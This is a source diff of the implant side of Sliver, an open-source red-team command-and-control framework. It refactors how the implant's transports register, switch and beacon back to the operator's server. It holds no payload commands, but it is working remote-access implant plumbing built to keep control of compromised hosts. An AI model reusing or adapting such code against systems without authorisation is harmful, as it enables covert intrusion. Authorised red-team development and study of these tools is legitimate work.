@@ -25,6 +25,7 @@ import (
 
 	"encoding/json"
 	"errors"
+	"fmt"
 	"net"
 	"net/url"
 	"os"
@@ -35,7 +36,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -43,7 +43,9 @@ import (
 
 	// {{if .Config.CommEnabled}}
 	"github.com/bishopfox/sliver/implant/sliver/comm"
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/transports"
+
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
@@ -70,10 +72,6 @@ type C2 struct {
 	attempts int      // Number of already tried connections
 	failures int      // Number of failed connections
 
-	// Some protocol stacks might require us to pass custom cleanup functions around
-	// and with detached pieces, like virtual interfaces for WireGuard, etc..
-	cleanup func() error
-
 	// conn - A physical connection initiated by/on behalf of this transport.
 	// From this conn will be derived one or more streams for different purposes.
 	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
@@ -86,7 +84,7 @@ type C2 struct {
 	// It can be nil if the Transport is tied to a pivoted implant.
 	// If the Transport is the ActiveConnection to the C2 server, this cannot
 	// be nil, as all underlying transports allow to register a RPC layer.
-	Connection Connection
+	Connection *transports.Connection
 
 	// Beacon - The transport can instantiate and use a Beacon client that matches
 	// the profile. This beacon is the equivalent of the above C2.Connection field
@@ -108,11 +106,13 @@ func NewC2FromBytes(profileData string) (t *C2, err error) {
 
 	// Base transport settings
 	t = &C2{
-		mutex:    &sync.RWMutex{},
-		failures: 0,
-		attempts: 0,
-		Profile:  &sliverpb.C2Profile{},
+		mutex:      &sync.RWMutex{},
+		failures:   0,
+		attempts:   0,
+		Profile:    &sliverpb.C2Profile{},
+		Connection: transports.NewConnection(),
 	}
+	t.Connection.ErrClosed = Transports.transportErrors
 
 	// Unmarshal from JSON
 	err = json.Unmarshal([]byte(profileData), t.Profile)
@@ -144,11 +144,14 @@ func NewC2FromProfile(p *sliverpb.C2Profile) (t *C2, err error) {
 
 	// Base transport settings
 	t = &C2{
-		ID:       p.ID,
-		failures: 0,
-		attempts: 0,
-		Profile:  p,
+		ID:         p.ID,
+		mutex:      &sync.RWMutex{},
+		failures:   0,
+		attempts:   0,
+		Profile:    p,
+		Connection: transports.NewConnection(),
 	}
+	t.Connection.ErrClosed = Transports.transportErrors
 
 	path := p.Hostname
 	if p.Port > 0 {
@@ -171,10 +174,10 @@ func NewC2FromProfile(p *sliverpb.C2Profile) (t *C2, err error) {
 }
 
 // Start the transport as it is currently configured and instantiated.
-func (t *C2) Start() (err error) {
+func (t *C2) Start(isSwitch bool, oldTransportID string) (err error) {
 
 	// Basic security values that need to be set
-	cryptography.OTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
+	cryptography.TOTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
 	cryptography.CACertPEM = string(t.Profile.Credentials.CACertPEM)
 
 	// The starting process happens in this order:
@@ -196,7 +199,10 @@ func (t *C2) Start() (err error) {
 	}
 
 	// Register this session
-	t.Register()
+	err = t.Register(isSwitch, oldTransportID)
+	if err != nil {
+		return
+	}
 
 	// If the C2 profile is a Session, serve the appropriate handlers
 	if t.Profile.Type == sliverpb.C2Type_Session {
@@ -204,7 +210,6 @@ func (t *C2) Start() (err error) {
 		log.Printf("Running in Session mode (Transport ID: %s)", t.ID)
 		// {{end}}
 
-		// And serve it
 		go t.ServeSessionHandlers()
 	}
 
@@ -216,8 +221,7 @@ func (t *C2) Start() (err error) {
 
 		go t.ServeBeacon()
 	}
-
-	return nil
+	return
 }
 
 // startTransport - For C2 channels that require a low-level primitive transport mechanism,
@@ -236,17 +240,21 @@ func (t *C2) startTransport() (err error) {
 }
 
 // Register - Handle any type of registration message, for any C2 channel/type.
-func (t *C2) Register() (err error) {
+func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {
+
+	// Short registration if we were just switching
+	if isSwitch {
+		t.Connection.RequestSend(t.registerSwitch(oldTransportID))
+		t.Profile.Active = true // This C2 is now active
+		return
+	}
 
 	// Register a session
 	if t.Profile.Type == sliverpb.C2Type_Session {
 		// Prepare the registration
 		data, err := proto.Marshal(t.registerSliver())
 		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Failed to encode register msg %s", err)
-			// {{end}}
-			return nil
+			return fmt.Errorf("Failed to encode register msg %s", err)
 		}
 		envelope := &sliverpb.Envelope{
 			Type: sliverpb.MsgRegister,
@@ -258,21 +266,13 @@ func (t *C2) Register() (err error) {
 	// Or register a beacon, wrapping the register into a special envelope.
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
 		t.Connection.RequestSend(t.registerBeacon())
-		// t.Beacon.Close() // RISKY WITH RACE CONDITIONS
-		t.Close() // RISKY WITH RACE CONDITIONS
+		t.Stop() // RISKY WITH RACE CONDITIONS
 		time.Sleep(time.Second)
 	}
 
 	// This C2 is now active
 	t.Profile.Active = true
 
-	return
-}
-
-// RegisterTransportSwitch - Notify the server that this transport is started after a switch
-func (t *C2) RegisterTransportSwitch(oldTransportID string) (err error) {
-	t.Connection.RequestSend(t.registerSwitch(oldTransportID))
-	t.Profile.Active = true // This C2 is now active
 	return
 }
 
@@ -285,16 +285,15 @@ func (t *C2) Stop() (err error) {
 	// {{end}}
 
 	// Close the RPC connection per se.
-	if t.Connection != nil {
-		err = t.Connection.Close()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error closing Session connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
-			// {{end}}
-		}
+	err = t.Connection.Close()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error closing Session connection: %s", err)
+		// {{end}}
 	}
 
 	// Just check the physical connection is not nil and kill it if necessary.
+	// Normally it should have been cleanup with the Connection type cleanup function.
 	if t.Conn != nil {
 		// {{if .Config.Debug}}
 		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
@@ -347,15 +346,8 @@ func (t *C2) registerSliver() *sliverpb.Register {
 		}
 	}
 
-	// Generate a unique ID for this session only
-	sessUUID, err := uuid.NewV4()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to generate session UUID: %s", err)
-		// {{end}}
-	}
 	// {{if .Config.Debug}}
-	log.Printf("Session UUID: %s", sessUUID)
+	log.Printf("Session UUID: %s", SessionID)
 	// {{end}}
 
 	// Retrieve host UUID
@@ -383,21 +375,13 @@ func (t *C2) registerSliver() *sliverpb.Register {
 		Filename:         filename,
 		ActiveC2:         t.uri.String(),
 		WorkingDirectory: workDir,
-		TransportID:      t.Profile.ID,
-		UUID:             sessUUID.String(),
+		TransportID:      t.ID,
+		UUID:             SessionID,
 	}
 }
 
 // registerBeacon - Prepare a beacon registration message.
 func (t *C2) registerBeacon() *sliverpb.Envelope {
-	// nextBeacon := time.Now().Add(t.Beacon.Duration())
-	// return Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
-	//         ID:          BeaconID,
-	//         Interval:    t.Beacon.Interval(),
-	//         Jitter:      t.Beacon.Jitter(),
-	//         Register:    t.registerSliver(),
-	//         NextCheckin: nextBeacon.UTC().Unix(),
-	// })
 	nextBeacon := time.Now().Add(t.Duration())
 	return Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          BeaconID,
@@ -413,12 +397,26 @@ func (t *C2) registerBeacon() *sliverpb.Envelope {
 // one, and we just update connection/transport relevant values.
 func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 
-	data, err := proto.Marshal(&sliverpb.RegisterTransportSwitch{
+	register := &sliverpb.RegisterTransportSwitch{
 		OldTransportID: oldTransportID,
 		TransportID:    t.ID,
 		RemoteAddress:  t.uri.String(),
+		Session:        t.registerSliver(),
 		Response:       &commonpb.Response{},
-	})
+	}
+
+	if t.Profile.Type == sliverpb.C2Type_Beacon {
+		nextBeacon := time.Now().Add(t.Duration())
+		register.Beacon = &sliverpb.BeaconRegister{
+			ID:          BeaconID,
+			Interval:    t.Profile.Interval,
+			Jitter:      t.Profile.Jitter,
+			Register:    t.registerSliver(),
+			NextCheckin: nextBeacon.UTC().Unix(),
+		}
+	}
+
+	data, err := proto.Marshal(register)
 
 	if err != nil {
 		// {{if .Config.Debug}}
